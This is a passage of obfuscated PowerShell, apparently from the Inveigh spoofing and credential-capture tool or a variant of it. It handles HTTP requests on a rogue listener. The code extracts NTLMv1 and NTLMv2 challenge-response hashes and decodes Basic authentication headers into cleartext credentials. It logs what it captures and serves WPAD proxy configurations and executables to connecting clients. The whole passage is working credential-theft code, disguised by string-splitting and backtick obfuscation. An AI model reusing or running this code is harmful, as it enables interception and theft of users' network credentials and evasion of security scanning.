                    ${iNve`Igh}."Po`sT`_`R`eQue`ST_LiST".("{1}{0}" -f'd','Ad').Invoke(${HtT`P_p`oST`_REquesT})

                    if(${IN`VeiGH}."fILe`_`OUTput")
                    {
                        ${IN`V`eiGH}."c`o`NSo`le_QuEuE".("{1}{0}" -f 'dd','A').Invoke(("$HTTP_type "+'PO'+'ST '+'r'+'equ'+'est '+'writ'+'ten'+' '+'to'+' '+'') + ${InV`E`iGh}."P`OSt`_ReQ`UEs`T_out_F`ilE")
                        ${invEI`Gh}."l`Og_f`ILE_Q`U`eUE".("{1}{0}"-f'dd','A').Invoke(("$(Get-Date -format 's') - $HTTP_type POST request captured from $HTTP_source_IP "))
                    }

                    if(${I`NVeIgh}."LoG_oU`T`puT")
                    {
                        ${i`NVei`gh}."L`OG".("{0}{1}" -f'Ad','d').Invoke(("$(Get-Date -format 's') - $HTTP_type POST request captured from $HTTP_source_IP "))
                    }

                }

                ${ht`Tp_`pOS`T_REQ`UEST_OlD} = ${htT`p_POSt_r`eQ`Ue`sT}
            }
            
            if(${hT`Tp_H`e`Ader`_aUthO`RizATIoN}.("{2}{0}{1}"-f'tar','tsWith','S').Invoke(("{1}{0}"-f' ','NTLM')))
            {
                
                ${ht`T`p_H`EAdE`R`_AUth`ORiZat`ioN} = ${ht`T`p_HeaDE`R`_aUth`OR`iZa`T`Ion} -replace ("{1}{0}" -f 'LM ','NT'),''
                [Byte[]]${ht`T`p`_`Re`QuEsT_bytEs} =  (  &("{2}{0}{1}"-f'iLdItE','M','Ch')  ('V'+'ari'+'ABLE:IgU7Qm')  ).VALue::("{1}{0}{3}{2}" -f '6','FromBase','tring','4S').Invoke(${H`TTp_`He`ADeR_AU`Th`oRIzATiON})
            
                if( (  &("{0}{1}" -f'Di','r')  vaRIablE:Cyj6e1  ).vALUe::"tOS`T`RiNG"(${Http_ReqU`e`sT_`BYTeS}[8..11]) -eq ("{2}{0}{1}"-f'00-00-0','0','01-'))
                {
                    ${nT`Lm} = &("{2}{1}{3}{0}" -f 'Base64','allen','NTLMCh','ge') ${Cha`llen`ge} ${HTtpn`T`l`mEsS} ${HtTP_`S`OuRC`E_ip} ${hTTp_`c`li`ent}."CLI`e`NT"."RE`MoT`eENdPoiNt"."P`ORt"
                }
                elseif( ( &("{3}{2}{1}{0}"-f'IABle','ar','ET-v','g') CyJ6e1  -vaL )::"T`OStrI`NG"(${hTtP_R`EqUE`s`T_b`YTes}[8..11]) -eq ("{2}{0}{1}"-f '-0','0-00-00','03'))
                {
                    ${H`T`TP_ntlM`_lEngTH} = &("{1}{0}{2}"-f'en','DataL','gth2') 20 ${hT`T`p_R`eQ`Uest_byTEs}
                    ${htTp`_NtL`M`_o`FFseT} = &("{1}{3}{0}{2}" -f'engt','Dat','h4','aL') 24 ${HttP_req`U`es`T_bYt`Es}
                    ${Htt`p_NtLm`_`DoMAin`_LENgTH} = &("{2}{1}{0}"-f 'gth2','aLen','Dat') 28 ${H`T`Tp_reQU`est_b`ytes}
                    ${h`TtP_`NTlm`_DOmain_o`F`F`s`et} = &("{1}{0}{2}" -f'a','Dat','Length4') 32 ${HT`Tp_`REqUeST`_`BYteS}
                    [String]${nTL`M_CH`A`LLENge} = ${I`NVEI`Gh}."Http_CH`A`llEnge_quE`Ue" -like ${htT`p_S`our`CE_ip} + ${H`Ttp_`clIEnT}."c`liEnt"."RE`M`oTEeN`DpO`Int"."po`RT" + '*'
                    ${In`VeI`gH}."htt`P`_`c`HAlL`ENGE_QU`EuE".("{2}{0}{1}"-f 'v','e','Remo').Invoke(${Ntlm_`c`H`ALLE`Nge})
                    ${NtLM_Chall`e`N`ge} = ${n`T`lM_CHaL`lE`Nge}.("{2}{0}{1}"-f'ubstr','ing','S').Invoke((${NtLm`_`ChALLe`NGE}.("{2}{1}{0}" -f'Of','ex','Ind').Invoke(",")) + 1)
                       
                    if(${h`Ttp`_nt`LM_Domain`_l`e`N`gTH} -eq 0)
                    {
                        ${HT`Tp`_ntLm_dOma`IN`_ST`R`Ing} = ""
                    }
                    else
                    {  
                        ${HTTp_n`TLM_`dOmAI`N_Str`I`Ng} = &("{1}{2}{0}{3}" -f'St','D','ataTo','ring') ${H`TtP`_n`Tlm_doMain_OffS`et} ${http_NtLM_DO`m`A`i`N_len`gTh} ${HtTp`_r`EQUeSt_by`TES}
                    } 
                    
                    ${H`Tt`P`_`NtlM_uSeR`_`lENgtH} = &("{0}{1}{3}{2}" -f'Data','Le','gth2','n') 36 ${Ht`T`p`_REQUE`St_Byt`es}
                    ${hT`TP`_NT`lM_`USER_o`FfsEt} = &("{0}{2}{1}" -f'Dat','h4','aLengt') 40 ${HTtp`_`Reque`sT`_byteS}
                    ${h`TTP_`NTlM`_u`SER_s`Tr`Ing} = &("{1}{3}{2}{0}" -f 'g','DataToSt','in','r') ${H`TTp_nTl`M`_UseR`_OFFsEt} ${http_`Ntl`m_`USer_`lEN`g`TH} ${hTT`P`_RE`qu`e`ST_bYTES}
                    ${h`T`TP_`NTl`m_host_`Le`Ngth} = &("{1}{0}{2}" -f 'taLe','Da','ngth2') 44 ${hT`TP`_RE`QUESt_BYtes}
                    ${ht`TP`_NTLm`_HOs`T`_O`FFsET} = &("{1}{2}{0}"-f 'gth4','Dat','aLen') 48 ${hTtp_ReQU`est`_by`Tes}
                    ${hTt`P_Ntl`m_HOst_`S`TRInG} = &("{3}{0}{2}{1}" -f 'ta','String','To','Da') ${HTt`p_`NTl`m_`host`_o`FfsET} ${h`Ttp_Ntl`m_hOs`T_LEn`gTH} ${Ht`T`p_Re`queST_Bytes}
        
                    if(${Ht`T`P`_nTLm_LEn`g`TH} -eq 24) 
                    {
                        ${NT`LM_`R`eSPo`NsE} =   (&("{1}{0}"-f'Ci','g') vARiabLE:CYj6E1  ).vaLUe::"toSTR`i`NG"(${H`TT`p_`R`equeS`T_byteS}[(${HT`TP_N`T`lm_OFFsET} - 24)..(${h`TT`p_`Nt`Lm_o`FfSet} + ${H`T`TP_`Ntlm_lE`NGth})]) -replace "-",""
                        ${n`TLM`_RESP`o`NsE} = ${Ntl`M_R`EspO`NSE}.("{0}{1}{2}" -f'In','se','rt').Invoke(48,':')
                        ${H`TT`p_NtLm_HAsh} = ${H`TTP_ntL`m`_U`seR_St`Ri`NG} + "::" + ${h`TtP_`N`Tlm_dOM`Ai`N_S`TRi`NG} + ":" + ${ntLM_R`ES`p`O`NsE} + ":" + ${ntL`M_C`hAllEn`Ge}
                    
                        if(${NTLm_cH`Al`lEn`Ge} -and ${NtLm_`R`esponse} -and (${in`V`eIGh}."MAC`Hi`Ne`_acCoUnts" -or (!${In`Ve`IgH}."Machin`E_ac`COu`N`Ts" -and -not ${Htt`p_`NtlM`_UsER_stR`i`Ng}.("{2}{1}{0}" -f'dsWith','n','E').Invoke('$'))))
                        {          
                            ${InVe`I`gH}."nTLM`V`1_lIsT".("{1}{0}"-f'dd','A').Invoke(${hTT`P_`NT`Lm_`HASh})

                            if(${I`NVeigh}."f`iLe`_`oUTPUt")
                            {
                                ${IN`VeI`GH}."lOg`_FI`Le_queuE".("{0}{1}"-f'Ad','d').Invoke(("$(Get-Date -format 's') - $HTTP_type NTLMv1 challenge/response for $HTTP_NTLM_domain_string\$HTTP_NTLM_user_string captured from $HTTP_source_IP($HTTP_NTLM_host_string) "))
                            }

                            if(${i`Nv`eIgH}."lO`G`_OuTpuT")
                            {
                                ${I`NVEi`GH}."L`oG".("{1}{0}" -f 'd','Ad').Invoke(("$(Get-Date -format 's') - $HTTP_type NTLMv1 challenge/response for $HTTP_NTLM_domain_string\$HTTP_NTLM_user_string captured from $HTTP_source_IP($HTTP_NTLM_host_string) "))
                            }
                        
                            if(!${I`Nv`EigH}."c`onSol`E_U`NiQ`Ue" -or (${inv`e`igh}."cOn`SOle_u`NI`Q`Ue" -and ${In`V`eiGh}."ntlMV`1_U`s`E`RnaMe_lISt" -notcontains ("$HTTP_source_IP "+"$HTTP_NTLM_domain_string\$HTTP_NTLM_user_string")))
                            {
                                ${I`Nv`EIgH}."C`oNSoLe_Qu`e`Ue".("{0}{1}" -f 'A','dd').Invoke($(&("{2}{1}{0}" -f 'Date','et-','G') -format 's') + (' '+'- '+"$HTTP_type "+'N'+'TLMv1'+' '+'c'+'ha'+'llenge'+'/resp'+'onse '+'ca'+'p'+'tured '+'f'+'rom '+"$HTTP_source_IP($HTTP_NTLM_host_string):`n$HTTP_NTLM_hash"))
                            }
                            else
                            {
                                ${I`NVeI`GH}."C`OnsOle_q`UEue".("{0}{1}"-f 'Ad','d').Invoke($(&("{1}{2}{0}"-f 'Date','Get','-') -format 's') + (' '+'- '+"$HTTP_type "+'NTL'+'Mv1 '+'challenge'+'/re'+'sp'+'onse'+' '+'ca'+'ptur'+'ed '+'fro'+'m '+"$HTTP_source_IP($HTTP_NTLM_host_string):`n$HTTP_NTLM_domain_string\$HTTP_NTLM_user_string "+'- '+'no'+'t '+'u'+'n'+'ique'))
                            }

                            if(${INV`EIGH}."FIL`E`_O`UTPUt" -and (!${i`NvEIGh}."File_`U`Nique" -or (${i`NvE`Igh}."Fi`le_uN`IQuE" -and ${I`N`VeIGh}."NTl`Mv`1_u`seRnAME_Li`sT" -notcontains ("$HTTP_source_IP "+"$HTTP_NTLM_domain_string\$HTTP_NTLM_user_string"))))
                            {
                                ${iN`Ve`IGH}."n`T`lm`V1_fILe_queue".("{1}{0}" -f'd','Ad').Invoke(${H`Ttp`_nTLM_haSh})
                                ${i`Nv`eIgH}."CON`SO`Le`_Q`UEUE".("{0}{1}"-f 'Ad','d').Invoke(("$HTTP_type "+'NTLMv1'+' '+'ch'+'a'+'llenge'+'/'+'re'+'sponse '+'writ'+'t'+'en '+'t'+'o '+'') + ${i`NV`EIgH}."NtlmV1_Ou`T_`FI`lE")
                            }

                            if(${iNvE`igh}."NTl`MV1_U`SErn`AmE_lisT" -notcontains ("$HTTP_source_IP "+"$HTTP_NTLM_domain_string\$HTTP_NTLM_user_string"))
                            {
                                ${In`VE`IGh}."ntlmv1`_uSe`RN`Ame_l`IsT".("{1}{0}" -f'd','Ad').Invoke(("$HTTP_source_IP "+"$HTTP_NTLM_domain_string\$HTTP_NTLM_user_string"))
                            }

                        }

                    }
                    else 
                    {         
                        ${n`TLm_rEs`po`Nse} =  ( &("{0}{1}"-f 'gC','i')  ('VaR'+'i'+'AblE'+':cYJ6'+'e1')  ).VAlue::"t`o`stRInG"(${ht`Tp_`Re`qUEs`T_ByT`eS}[${hTT`P_Nt`Lm`_O`FFs`Et}..(${ht`TP_n`TLm_OF`FS`et} + ${hT`Tp_nTlM_`L`e`NG`Th})]) -replace "-",""
                        ${n`TLM`_ReSpONSe} = ${NtlM_REspO`N`Se}.("{0}{1}" -f 'I','nsert').Invoke(32,':')
                        ${HttP`_NT`Lm_`haSh} = ${h`T`T`p_`NT`lM_USEr_StrING} + "::" + ${hTTp`_nT`lM_doMAin_ST`R`iNG} + ":" + ${nTL`m_`cHal`LEnGE} + ":" + ${N`TLM_r`esP`OnsE}

                        if(${nTLm`_cHall`e`NGe} -and ${nt`Lm_`ReSPoNSe} -and (${INV`e`igH}."m`AC`hiNe_`AcC`oUnTs" -or (!${In`VE`igh}."mac`hinE`_`ACCoUN`TS" -and -not ${hTTP_nt`lm_us`eR`_St`R`ING}.("{2}{1}{0}" -f'th','sWi','End').Invoke('$'))))
                        {
                            ${INV`Ei`GH}."N`Tl`mv`2_LIst".("{0}{1}" -f 'A','dd').Invoke(${HtTp_N`Tlm_`hash})

                            if(${INve`Igh}."File`_o`UtPUT")
                            {
                                ${iNVe`IgH}."L`OG_fiL`e_qU`EUE".("{0}{1}" -f'Ad','d').Invoke($(&("{2}{0}{1}" -f '-','Date','Get') -format 's') + (' '+'- '+"$HTTP_type "+'N'+'TLMv2'+' '+'c'+'hallen'+'ge/respons'+'e'+' '+'for'+' '+"$HTTP_NTLM_domain_string\$HTTP_NTLM_user_string "+'c'+'aptured'+' '+'f'+'rom '+"$HTTP_source_IP($HTTP_NTLM_host_string)"))
                            }

                            if(${i`NvEi`Gh}."Lo`G_`ouTPut")
                            {
                                ${in`VEigh}."L`Og".("{1}{0}" -f'dd','A').Invoke($(&("{1}{0}{2}" -f 'Da','Get-','te') -format 's') + (' '+'- '+"$HTTP_type "+'NT'+'LM'+'v2 '+'chal'+'lenge/'+'r'+'espon'+'s'+'e '+'fo'+'r '+"$HTTP_NTLM_domain_string\$HTTP_NTLM_user_string "+'c'+'a'+'ptur'+'ed '+'fro'+'m '+"$HTTP_source_IP($HTTP_NTLM_host_string)"))
                            }
                        
                            if(!${iNV`EI`Gh}."cONS`O`lE`_UNI`que" -or (${i`NVE`IGH}."cO`NsO`LE_UNi`Que" -and ${I`N`VEIGH}."N`TlmV2`_u`s`er`N`AmE_LISt" -notcontains ("$HTTP_source_IP "+"$HTTP_NTLM_domain_string\$HTTP_NTLM_user_string")))
                            {
                                ${i`N`VeiGH}."Consol`E_`qu`EUe".("{1}{0}"-f 'd','Ad').Invoke($(&("{0}{1}" -f'Get-Da','te') -format 's') + (' '+'- '+"$HTTP_type "+'N'+'T'+'LMv2 '+'challe'+'nge/r'+'es'+'p'+'onse '+'captu'+'re'+'d '+'from'+' '+"$HTTP_source_IP($HTTP_NTLM_host_string):`n$HTTP_NTLM_hash"))
                            }
                            else
                            {
                                ${IN`V`EiGh}."C`onsoLe_q`UE`Ue".("{1}{0}" -f'd','Ad').Invoke($(&("{2}{1}{0}"-f 'e','et-Dat','G') -format 's') + (' '+'- '+"$HTTP_type "+'N'+'TLMv2 '+'challen'+'g'+'e'+'/res'+'po'+'nse '+'capt'+'ur'+'ed '+'f'+'rom '+"$HTTP_source_IP($HTTP_NTLM_host_string):`n$HTTP_NTLM_domain_string\$HTTP_NTLM_user_string "+'- '+'no'+'t '+'u'+'niq'+'ue'))
                            }

                            if(${INv`eigh}."file`_`ouTP`Ut" -and (!${inV`e`iGH}."F`iLe_`Un`iQuE" -or (${In`V`EIGH}."f`ilE_`UnIQuE" -and ${I`NVE`IgH}."nTL`mV2`_use`RNAmE_LI`sT" -notcontains ("$HTTP_source_IP "+"$HTTP_NTLM_domain_string\$HTTP_NTLM_user_string"))))
                            {
                                ${INVE`I`gH}."N`TLM`V2_FiL`E_qU`eUe".("{1}{0}"-f'dd','A').Invoke(${http_Ntl`M_`ha`SH})
                                ${IN`VEIgh}."CoNs`o`Le_QUeuE".("{1}{0}" -f 'd','Ad').Invoke(("$HTTP_type "+'NTLM'+'v2 '+'c'+'halle'+'nge/r'+'espo'+'n'+'se '+'writ'+'ten '+'to'+' '+'') + ${i`Nv`EIgh}."n`TlMv2_OUT`_`Fi`Le")
                            }

                            if(${IN`V`eIGh}."NTlmv`2_`US`ERnaMe_`lIst" -notcontains ("$HTTP_source_IP "+"$HTTP_NTLM_domain_string\$HTTP_NTLM_user_string"))
                            {
                                ${i`NvEI`Gh}."n`TLMV2_USerNA`me_`L`Ist".("{0}{1}" -f'A','dd').Invoke(("$HTTP_source_IP "+"$HTTP_NTLM_domain_string\$HTTP_NTLM_user_string"))
                            }
                        
                        }

                    }

                    if (${IN`VeIGH}."IP_`capTu`RE_l`Ist" -notcontains ${HTT`P`_S`oURce_`Ip} -and -not ${HT`Tp_ntL`m_`US`Er_`StriNg}.("{0}{2}{1}" -f 'Ends','h','Wit').Invoke('$') -and !${I`Nve`igh}."sPOOFer`_rEp`eAt" -and ${HtTP_`s`oUR`cE_iP} -ne ${iP})
                    {
                        ${i`NVeIgH}."I`p_CAp`T`Ure_`List".("{0}{1}"-f'A','dd').Invoke(${H`TTP`_`sOU`RcE_ip})
                    }
                
                    ${hTtP_r`E`s`Po`NsE`_`StaTU`s_cO`de} = 0x32,0x30,0x30
                    ${ht`Tp`_re`S`P`oNSE_pHrAsE} = 0x4f,0x4b
                    ${htT`p_c`LIen`T_cl`oSE} = ${TR`UE}
                    ${NtLM`_CHaLlE`NGe} = ""

                    if(${prOx`Y`_lis`T`ENeR})
                    {
                        
                        if(${H`Tt`PrEsp`ONse} -or ${hT`TPd`IR})
                        {
                            ${h`TT`p_HeA`deR_Ca`CHe`_`COntr`OL} = 0x43,0x61,0x63,0x68,0x65,0x2d,0x43,0x6f,0x6e,0x74,0x72,0x6f,0x6c,0x3a,0x20,0x6e,0x6f,0x2d,0x63,0x61,0x63,0x68,0x65,0x2c,0x20,0x6e,0x6f,0x2d,0x73,0x74,0x6f,0x72,0x65
                        }
                        else
                        {
                            ${HT`T`p_SENd} = ${F`AL`Se}
                        }

                    }

                }
                else
                {
                    ${HtTp`_`CL`ient_CLose} = ${t`RUe}
                }

            }
            elseif(${H`T`TP_HeA`der_`Au`THori`ZATion}.("{2}{0}{1}"-f'artswi','th','st').Invoke(("{1}{0}"-f'asic ','B')))
            {
                ${H`TTP_ReSp`oNse_S`TATuS`_`coDe} = 0x32,0x30,0x30
                ${h`TTp_`RE`spO`Nse_`PH`RASe} = 0x4f,0x4b
                ${ht`T`P_hEa`DeR`_AuThORizaTI`oN} = ${htTp_he`A`D`eR_aUt`hORizATiON} -replace ("{1}{0}"-f' ','Basic'),''
                ${clEarT`ext_CrED`eN`T`IAlS} =  $9t2JBy::"u`Tf8"."g`etstri`NG"( (  &("{0}{1}"-f 'gC','i')  VaRIaBlE:iGu7qM).vAluE::("{1}{0}{4}{3}{2}" -f'B','From','g','e64Strin','as').Invoke(${httP_HEAder`_AU`THoR`IzatI`oN}))
                ${h`T`T`p_`CliENt_`cLoSE} = ${t`RUe}
                ${i`NVeiGh}."Cle`Art`ext_`FiLE_`queUe".("{1}{0}" -f 'dd','A').Invoke(${CLeaRTexT_`cr`E`DE`NT`i`ALS})
                ${iNv`eIGH}."CLE`ArTE`XT_`lI`st".("{1}{0}" -f 'd','Ad').Invoke(${cleaRT`e`Xt_`CRe`dENTiAls})
                ${iN`VeigH}."Con`s`Ole_`qUeue".("{1}{0}"-f 'dd','A').Invoke(("$(Get-Date -format 's') - $HTTP_type Basic auth cleartext credentials $cleartext_credentials captured from $HTTP_source_IP "))

                if(${i`NVE`iGh}."FI`Le_oUTp`Ut")
                {
                    ${Inv`EI`gh}."c`on`so`lE_QU`euE".("{1}{0}" -f'd','Ad').Invoke(("$HTTP_type "+'B'+'asic '+'auth'+' '+'clea'+'rt'+'ex'+'t '+'cre'+'den'+'ti'+'als '+'wri'+'tt'+'en '+'to'+' '+'') + ${In`Ve`iGH}."c`LEA`R`TexT_o`Ut_fILe")
                    ${IN`V`EIGH}."lOg_FIL`e_`Q`UEUe".("{0}{1}" -f 'Ad','d').Invoke(("$(Get-Date -format 's') - Basic auth cleartext credentials captured from $HTTP_source_IP "))
                }

                if(${i`NVe`igH}."lOg`_O`UT`PUt")
                {
                    ${iN`VE`IGH}."l`Og".("{1}{0}" -f 'd','Ad').Invoke(("$(Get-Date -format 's') - Basic auth cleartext credentials captured from $HTTP_source_IP "))
                }
                 
            }

            if((${HttP_rE`queS`T_Ra`w_`Url} -notmatch ("{0}{2}{1}" -f'/','pad.dat','w') -and ${Ht`TPA`UTH} -eq ("{2}{0}{1}" -f 'no','nymous','A')) -or (${h`Tt`p_reqUE`St_`R`A`w_URL} -match ("{2}{0}{1}"-f'wpa','d.dat','/') -and ${wpAda`U`Th} -eq ("{2}{3}{1}{0}" -f'us','mo','Ano','ny')) -or (
            ${wPADa`UtHigN`o`Re}."COU`NT" -gt 0 -and ${wP`A`dAuth} -like ("{1}{0}"-f'LM*','NT') -and (${w`padA`U`ThigNORE} | &("{1}{2}{3}{0}"-f 'ect','Where-O','b','j') {${Ht`Tp_`h`eaD`er_usER`_aG`Ent} -match ${_}})) -or ${HtTp_c`LIE`N`T_ClO`se})
            {

                if(${HTtp`d`ir} -and ${h`TtPde`FaUL`T`EXE} -and ${HTTp_r`EqU`eS`T_r`Aw_uRL} -like ("{0}{1}" -f '*','.exe') -and (&("{2}{1}{0}"-f'th','-Pa','Test') (&("{0}{1}{2}"-f 'Join-P','at','h') ${h`TtPdIR} ${h`TT`pdEFAulTe`XE})) -and !(&("{1}{2}{0}" -f 'Path','Test','-') (&("{0}{1}"-f 'Join-Pa','th') ${H`TTpdir} ${htTP_REq`U`est_`RA`W_`Url})))
                {
                    [Byte[]]${HTt`P_me`sSa`ge_`BytEs} =   ( &("{0}{3}{1}{2}" -f 'G','A','RIAble','ET-V') ('o0'+'6') -vaLU )::("{3}{1}{2}{0}"-f 'Bytes','adAl','l','Re').Invoke((&("{0}{1}{2}"-f'Jo','in-P','ath') ${H`TtpdIr} ${HT`TPdEf`AUL`TeXe}))
                    ${ht`TP_h`E`ADEr_cONT`EN`T`_ty`PE} = 0x43,0x6f,0x6e,0x74,0x65,0x6e,0x74,0x2d,0x54,0x79,0x70,0x65,0x3a,0x20 +   (  &("{3}{0}{1}{2}{4}"-f 't-CH','iL','DiT','Ge','eM')  vaRiabLE:9t2jBy).ValuE::"u`Tf8".("{0}{1}"-f 'GetBy','tes').Invoke(("{1}{3}{0}{2}" -f'c','app','ation/exe','li'))
                }
                elseif(${HTT`p`dir})
                {

                    if(${htt`PdefAu`LtF`I`le} -and !(&("{2}{1}{0}"-f 'ath','t-P','Tes') (&("{2}{0}{1}"-f'oin-Pat','h','J') ${HtT`Pd`iR} ${HtT`P_rEq`Ue`s`T_r`AW`_url})) -and (&("{2}{0}{1}"-f'est-Pa','th','T') (&("{1}{2}{0}" -f'h','Join','-Pat') ${htT`Pd`IR} ${h`TTp`deF`AUltF`ilE})) -and ${HTTp_re`quESt_`RA`w_`U`RL} -notmatch ("{2}{1}{0}"-f'at','.d','/wpad'))
                    {
                        [Byte[]]${h`TTp`_`ME`sSaGE_ByTes} =   (  &("{0}{1}"-f'gC','i') vARIable:o06 ).VALuE::("{0}{3}{2}{1}" -f'ReadAll','es','yt','B').Invoke((&("{2}{0}{1}"-f'oin','-Path','J') ${hTTP`dIr} ${Htt`pd`efAUlt`FIle}))
                    }
                    elseif((${hTT`pDefau`lTfI`le} -and ${h`TtP`_R`EqUEST`_raw_U`Rl} -eq '' -or ${hTT`P`Def`A`UltfIlE} -and ${HT`TP_REQ`UEsT`_raW_`Url} -eq '/') -and (&("{0}{1}" -f'Test-Pa','th') (&("{1}{0}{2}"-f 't','Join-Pa','h') ${htT`P`dIr} ${H`T`TPDEFAUl`T`FiLE})))
                    {
                        [Byte[]]${h`TTp_MeSSaGe_`B`ytEs} =  ( &('ls')  VarIAble:O06).vaLUe::("{1}{0}{2}" -f 'l','ReadAl','Bytes').Invoke((&("{2}{1}{0}"-f'Path','-','Join') ${h`TtPD`IR} ${h`Tt`pdEfA`ULtF`Ile}))
                    }
                    elseif(${WpAdr`eSpo`N`se} -and ${HTTp_RE`qUEs`T_Ra`W`_U`RL} -match ("{0}{1}{2}"-f'/wpa','d.','dat'))
                    {
                        [Byte[]]${httP_meSs`Ag`e_BYt`es} =  $9T2JBy::"U`TF8".("{2}{0}{1}" -f'etByte','s','G').Invoke(${wp`ADr`e`SPOnSE})
                        ${Http_HEAD`ER`_cO`NteN`T`_T`yPE} = 0x43,0x6f,0x6e,0x74,0x65,0x6e,0x74,0x2d,0x54,0x79,0x70,0x65,0x3a,0x20 +  (  &("{1}{0}" -f 'Le','Variab')  9T2jbY  -vaLueON )::"U`Tf8".("{1}{0}{2}" -f 'By','Get','tes').Invoke(("{3}{4}{1}{5}{8}{7}{2}{6}{0}"-f'toconfig','i','-proxy-','applic','at','on','au','ns','/x-'))
                    }
                    else
                    {

                        if(&("{1}{0}"-f '-Path','Test') (&("{2}{1}{0}" -f'Path','in-','Jo') ${H`TtpD`ir} ${HTtP_ReqUEst`_`Ra`w_urL}))
                        {
                            [Byte[]]${hTTP_mEs`S`AgE_`B`Yt`ES} =  (  &("{2}{3}{0}{1}"-f 'B','LE','GEt-Vari','a') ('o0'+'6') -vAlU  )::("{1}{2}{0}"-f 'es','ReadAllB','yt').Invoke((&("{0}{2}{1}" -f'Join','ath','-P') ${ht`Tp`dIR} ${H`Ttp_`REQuEST`_raw_uRL}))
                        }
                        else
                        {
                            [Byte[]]${hT`TP_`M`es`saGE_`By`Tes} =  (&("{0}{2}{3}{1}" -f'GEt-v','e','ar','IABL')  9T2jbY).VAlue::"U`TF8".("{0}{1}" -f'GetB','ytes').Invoke(${H`TTPREsPO`N`sE})
                        }
            
                    }

                }
                else
                {
                
                    if(${WP`AdR`eSpOnSe} -and ${hT`Tp_R`EquEs`T_`R`AW_urL} -match ("{1}{0}{2}" -f'd','/wpad.','at') -and (!${P`R`OX`YiGnOrE} -or !(${Pr`o`XyIg`NORe} | &("{2}{3}{0}{1}" -f 're-Obj','ect','Wh','e') {${HTt`P`_h`Ea`dE`R_uSeR_agEnt} -match ${_}})))
                    {
                        ${htt`P_me`SS`AGE} = ${w`p`AdRE`SPONSE}
                        ${HttP_hE`AdEr_`con`TeNt_t`yPE} = 0x43,0x6f,0x6e,0x74,0x65,0x6e,0x74,0x2d,0x54,0x79,0x70,0x65,0x3a,0x20 +  (  &('ls')  ('v'+'AriABl'+'E'+':9t'+'2Jby') ).Value::"U`TF8".("{1}{2}{0}"-f 's','GetBy','te').Invoke(("{6}{1}{4}{2}{3}{5}{0}" -f'g','on/x','ns-p','rox','-','y-autoconfi','applicati'))
                    }
                    elseif(${HTT`pREsP`o`NSE})
                    {
                        ${HtTp`_mES`sAgE} = ${HtTp`REs`pOn`se}
                        
                        if(${htT`PCon`TenTTY`pe})
                        {
                            ${h`T`TP_hEa`dER_Co`NTEn`T_`Type} = 0x43,0x6f,0x6e,0x74,0x65,0x6e,0x74,0x2d,0x54,0x79,0x70,0x65,0x3a,0x20 +  (  &("{1}{2}{0}" -f'blE','GET-V','ariA')  ("9T"+"2Jby") ).vaLue::"ut`F8".("{0}{1}{2}" -f 'GetB','yte','s').Invoke(${h`TTpco`NTenTty`pe})
                        }

                    }

                    [Byte[]]${h`TTP_`mE`Ssa`Ge_BY`TEs} =   (&("{2}{0}{1}"-f'T','-IteM','gE') ("vAr"+"iA"+"ble"+":9t2jBy")).vALUE::"UT`F8".("{0}{1}" -f 'GetByt','es').Invoke(${H`TTP_MESsA`Ge})
                }

            }
            else
            {
                [Byte[]]${H`TTP_`MeSsA`Ge_BYTeS} =   ( &("{0}{1}{2}" -f 'ge','t-CH','ILditEm') vaRiABLe:9t2jby).VALue::"u`TF8".("{2}{0}{1}"-f'tBy','tes','Ge').Invoke(${HT`T`p`_MESSage})
            }

            ${hT`Tp_t`iM`EsTAmP} = &("{1}{0}" -f 'te','Get-Da') -format ('r')
            ${htT`p_`Ti`mESTamP} =  ( &("{1}{2}{0}" -f'aBlE','v','ARI') ("9t2jB"+"Y")  -VAluEONly)::"uT`F8".("{1}{2}{0}" -f'ytes','Get','B').Invoke(${HT`TP_tiMeS`TA`mp})
            ${htTP`_heaDer_cONT`eNt_l`e`NGTh} = 0x43,0x6f,0x6e,0x74,0x65,0x6e,0x74,0x2d,0x4c,0x65,0x6e,0x67,0x74,0x68,0x3a,0x20 +   ( &("{1}{2}{0}" -f'E','vaRIAb','l')  ('9T2'+'jby')).vaLuE::"uT`F8".("{0}{1}" -f'Get','Bytes').Invoke(${H`TTp_`M`es`sagE_BYTes}."L`enG`TH")

            if((${ht`T`PaU`Th} -like ("{1}{0}" -f 'M*','NTL') -and ${httP_R`E`Ques`T_`RA`w_u`RL} -notmatch ("{1}{0}{2}"-f'wpa','/','d.dat')) -or (${w`pAda`U`Th} -like ("{1}{0}" -f 'M*','NTL') -and ${h`TtP_Re`Qu`eS`T_RAW_URl} -match ("{2}{0}{1}"-f'd','at','/wpad.')) -and !${H`TTP_`C`liE`Nt_CL`ose})
            {
                ${h`Tt`p_heaD`E`R_`AUTheNti`cAte_datA} =  ( &("{2}{0}{1}" -f 'IA','bLe','vAR')  9t2jBY  -valUeOn )::"ut`F8".("{1}{0}{2}"-f'By','Get','tes').Invoke(${N`TLm})
            }
            elseif((${ht`TPAU`TH} -eq ("{1}{0}" -f 'ic','Bas') -and ${HtTp_`ReQ`Uest_`RaW`_Url} -notmatch ("{1}{2}{0}" -f't','/wp','ad.da')) -or (${wp`A`dAUTh} -eq ("{1}{0}" -f'c','Basi') -and ${htT`P_reQ`Ues`T`_raw`_URL} -match ("{2}{0}{1}" -f'd.','dat','/wpa')))
            {
                ${HTtP`_`h`EadEr_auT`H`eNtI`catE_DAtA} =  (  &("{1}{2}{0}" -f'aBLE','GeT-V','ari')  ('9'+'t2jby')).VAlue::"UT`F8".("{0}{2}{1}" -f'GetBy','s','te').Invoke(('Ba'+'s'+'ic '+"realm=$HTTPBasicRealm"))
            }

            ${Pac`KEt_h`TT`prE`SP`ONsE} = &("{1}{2}{0}" -f'ject','N','ew-Ob') ("{5}{8}{7}{1}{2}{6}{0}{4}{3}" -f 'rderedDict','cti','ons','ry','iona','S','.Specialized.O','tem.Colle','ys')
            ${p`AcKet_Http`ReS`po`NSe}.("{1}{0}"-f 'dd','A').Invoke(("{0}{5}{4}{3}{1}{2}" -f 'H','sio','n','uestVer','sponse_Req','TTPRe'),[Byte[]](0x48,0x54,0x54,0x50,0x2f,0x31,0x2e,0x31,0x20))
            ${PaC`Ket_htTp`R`eS`POn`Se}.("{0}{1}"-f'A','dd').Invoke(("{1}{5}{4}{3}{0}{2}{6}"-f'us','H','C','nse_Stat','TPRespo','T','ode'),${HTTP_respOnsE_S`TA`Tu`s_`CODe} + [Byte[]](0x20))
            ${Pa`cKEt_hT`TpRe`spONse}.("{1}{0}"-f 'dd','A').Invoke(("{3}{5}{4}{2}{0}{1}"-f'onsePh','rase','e_Resp','HTTP','espons','R'),${hT`Tp`_RESpOnse_`PHR`Ase} + [Byte[]](0x0d,0x0a))
